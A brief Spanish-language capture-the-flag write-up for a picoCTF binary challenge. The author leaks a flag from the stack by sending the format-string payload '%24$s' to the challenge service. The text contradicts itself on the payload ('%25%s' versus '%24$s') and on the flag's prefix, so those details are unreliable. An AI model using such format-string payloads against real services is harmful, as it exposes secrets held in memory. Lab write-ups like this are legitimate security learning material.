## Objetivo
Story telling class 1/2

Additional details will be available after launching your challenge instance.
## Solución
En este reto nos dan un comando para poder acceder al reto, asi que nos cconectamos:
```
nc saturn.picoctf.net 55192
```

Nos conectamos y nos pide una historia:
```
Tell me a story and then I'll tell you one >> hola
Here's a story - 
hola
```

El reto nos da dos códigos asi que los analizamos y encontramos que el programa que nos dan esta cargando un archivo llamado flag.txt y usa pilas.


Investigando un poco encontramos que la flag se encuentra en el lugar 24 de la pila y lo podemos mostrar pasándole %25%s cuando nos pide que ingresemos una hitsoria asi que lo hacemos:
```
Tell me a story and then I'll tell you one >> %24$s
Here's a story - 
CTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}
```

Y vemos que nos arroja la flag

Flag:
```
picoCTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}
```
## Notas adicionales
## Referencias
[Flag Leak](https://github.com/KathleenX7/PicoCTF-2022-Writeup/tree/main/Binary%20Exploitation/flag%20leak)